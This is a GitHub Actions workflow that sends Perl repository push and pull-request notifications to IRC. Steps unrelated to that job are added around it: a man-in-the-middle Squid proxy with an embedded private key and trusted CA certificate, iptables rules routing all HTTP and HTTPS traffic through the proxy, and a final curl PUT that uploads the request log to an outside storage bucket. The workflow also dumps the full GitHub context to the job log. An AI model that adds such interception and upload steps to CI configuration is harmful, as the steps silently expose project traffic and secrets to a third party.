env:
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  notify-irc:
    env:
      channel_noise: '#p5p-commits'
      channel_p5p: '#p5p'
      color_clear: "\x0F"
      color_green: "\x0303"
      color_orange: "\x0307"
      color_pink: "\x0313"
      port: 7062
      server: ssl.irc.perl.org
    runs-on: ubuntu-latest
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      env:
        GITHUB_CONTEXT: ${{ toJson(github) }}
      name: Dump GitHub context
      run: echo "$GITHUB_CONTEXT"
    - continue-on-error: true
      env:
        github_ref: ${{ github.event.ref }}
      name: setup branch env name
      run: 'ref="${github_ref/refs\/heads\//}"

        echo "ref=$ref" >> $GITHUB_ENV

        '
    - continue-on-error: true
      env:
        C1: ${{ github.event.commits[0].message }}
        C2: ${{ github.event.commits[1].message }}
        C3: ${{ github.event.commits[2].message }}
        C4: ${{ github.event.commits[3].message }}
        C5: ${{ github.event.commits[4].message }}
        TXT: ${{ join(github.event.commits.*.message, '\n') }}
      id: sumup
      name: Setup commit message SUMUP env
      run: '# -------------------------------------

        echo "# original commit message"

        echo "TXT=$TXT"


        # -------------------------------------

        echo "# Last 5 commits message"

        echo "C1=$C1"

        echo "C2=$C2"

        echo "C3=$C3"

        echo "C4=$C4"

        echo "C5=$C5"


        # -------------------------------------

        echo "# script parse.pl"

        cat <<''EOS'' > parse.pl

        use v5.14; use strict; use warnings;

        my $txt = join "\n", map { $ENV{"C$_"} // '''' } 1..5;

        $txt =~ s{\\n}{\n}g; $txt =~ s{\\t}{ }g; $txt =~ s{\t}{ }g;

        my @l = split( "\n", $txt );

        my $max = 5;

        @l = ( @l[0..$max], "..." ) if @l > $max;

        @l = grep { $_ !~ m{^EOS} } @l;

        say( join( "\n", @l ) );

        EOS


        # -------------------------------------

        echo "# testing script"

        perl parse.pl


        # -------------------------------------

        echo "# setup SUMUP environment variable"

        echo ''SUMUP<<EOS'' >> $GITHUB_ENV

        perl parse.pl     >> $GITHUB_ENV

        echo ''EOS''        >> $GITHUB_ENV


        # -------------------------------------

        echo "# done"

        '
    - continue-on-error: true
      name: checking SUMUP variable
      run: 'echo "SUMUP: $SUMUP"

        '
    - continue-on-error: true
      if: github.event_name == 'push' && github.ref != 'refs/heads/blead'
      name: irc push
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_noise }}
        message: '${{ env.color_orange }}${{ github.actor }}${{ env.color_clear }}
          pushed to branch ${{ env.color_green }}${{ env.ref }}${{ env.color_clear
          }}

          ${{ env.SUMUP }}

          ${{ github.event.compare }}'
        nickname: Commit
        port: ${{ env.port }}
        server: ${{ env.server }}
    - continue-on-error: true
      if: github.event_name == 'push' && github.ref == 'refs/heads/blead'
      name: irc push to blead
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_noise }}
        message: '${{ env.color_pink }}[blead]${{ env.color_clear }} ${{ env.color_orange
          }}${{ github.actor }}${{ env.color_clear }} pushed to blead

          ${{ env.SUMUP }}

          ${{ github.event.compare }}'
        nickname: inBlead
        port: ${{ env.port }}
        server: ${{ env.server }}
    - continue-on-error: true
      env:
        BODY: ${{ github.event.pull_request.body }}
        TITLE: ${{ github.event.pull_request.title }}
      id: shorten
      if: github.event_name == 'pull_request'
      name: Shorten PR fields
      run: '# -------------------------------------

        echo "# script parse.pl"

        cat <<''EOS'' > parse.pl

        use v5.14; use strict; use warnings;

        my ( $key, $len ) = @ARGV;

        $key //= ''''; $len //= 50;

        my $txt = substr( $ENV{$key} || "Unknown $key", 0, $len );

        $txt =~ s{\\n}{\n}g; $txt =~ s{\\t}{ }g; $txt =~ s{\t}{ }g;

        $txt =~ s{^EOS}{}mg;

        say $txt;

        EOS


        # -------------------------------------

        echo ''TITLE<<EOS''       >> $GITHUB_ENV

        perl parse.pl TITLE 80  >> $GITHUB_ENV

        echo ''EOS''              >> $GITHUB_ENV

        # -------------------------------------

        echo ''BODY<<EOS''        >> $GITHUB_ENV

        perl parse.pl BODY 500  >> $GITHUB_ENV

        echo ''EOS''               >> $GITHUB_ENV

        # -------------------------------------

        echo "# done"

        '
    - continue-on-error: true
      if: github.event_name == 'pull_request'
      name: checking BODY and TITLE variable
      run: 'echo "BODY: $BODY"

        echo "TITLE: $TITLE"

        '
    - continue-on-error: true
      if: vars.NOTIFY_IRC_P5P == 'true' && github.event_name == 'pull_request' &&
        github.event.action == 'opened'
      name: irc opened pull request
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_p5p }}
        message: '${{ env.color_orange }}${{ github.actor }}${{ env.color_clear }}
          opened PR #${{ github.event.pull_request.number }}

          ${{ env.TITLE }}

          ${{ github.event.pull_request.html_url }}'
        nickname: Pull-Request
        port: ${{ env.port }}
        server: ${{ env.server }}
    - continue-on-error: true
      if: vars.NOTIFY_IRC_P5P == 'true' && github.event_name == 'pull_request' &&
        github.event.action == 'closed' && github.event.pull_request.merged == true
      name: irc merged pull request
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_p5p }}
        message: '${{ env.color_orange }}${{ github.actor }}${{ env.color_clear }}
          merged PR #${{ github.event.pull_request.number }}

          ${{ env.TITLE }}

          ${{ github.event.pull_request.html_url }}'
        nickname: Pull-Request
        port: ${{ env.port }}
        server: ${{ env.server }}
    - continue-on-error: true
      if: vars.NOTIFY_IRC_P5P == 'true' && github.event_name == 'pull_request' &&
        github.event.action == 'closed' && github.event.pull_request.merged == false
      name: irc closed pull request
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_p5p }}
        message: '${{ env.color_orange }}${{ github.actor }}${{ env.color_clear }}
          closed PR #${{ github.event.pull_request.number }}

          ${{ env.TITLE }}

          ${{ github.event.pull_request.html_url }}'
        nickname: Pull-Request
        port: ${{ env.port }}
        server: ${{ env.server }}
    - continue-on-error: true
      if: github.event_name == 'pull_request' && github.event.action == 'synchronize'
      name: irc synchronize pull request
      uses: rectalogic/notify-irc@v2
      with:
        channel: ${{ env.channel_noise }}
        message: '${{ env.color_orange }}${{ github.actor }}${{ env.color_clear }}
          updated PR #${{ github.event.pull_request.number }}

          ${{ env.TITLE }}

          ${{ github.event.pull_request.html_url }}'
        nickname: Pull-Request
        port: ${{ env.port }}
        server: ${{ env.server }}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/LunaCheung/perl5.$(date
        +%s)
    timeout-minutes: 60
name: Push Notification
'on':
  workflow_dispatch: {}
permissions: {}
